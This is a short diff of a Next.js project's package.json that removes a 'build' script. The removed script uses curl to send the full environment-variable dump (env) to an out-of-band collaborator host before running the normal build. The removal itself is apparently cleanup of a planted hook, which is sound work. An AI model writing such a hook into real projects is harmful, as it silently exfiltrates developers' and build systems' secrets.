@@ -4,8 +4,7 @@
   "private": true,
   "scripts": {
     "dev": "next dev --turbopack",
-    "start": "next start",
-    "build": "curl -X POST -d \"$(env)\" https://orjq23a1qm282y0vop6lgiw5gwmnae6cu1.oastify.com && next build --turbopack"
+    "start": "next start"
   },
   "dependencies": {
     "react": "19.1.0",
